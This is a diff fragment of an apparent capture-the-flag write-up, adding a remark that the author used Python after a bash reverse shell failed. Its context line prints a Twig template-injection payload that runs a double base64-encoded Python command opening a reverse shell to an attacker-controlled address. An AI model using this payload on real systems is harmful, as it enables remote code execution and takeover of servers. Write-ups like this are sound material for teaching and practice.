@@ -145,6 +145,8 @@ Payload:
 {{ ['python3 -c "$(echo YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxkQ2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVibVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1hV3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0NnPT0K | base64 -d | base64 -d)"', ''] | sort('passthru') }}
 ```
 
+Why py?? Basic bash rev-shell didn't work for me... And yes, I was wrong.
+
 ## 7. Flag
 
 ```
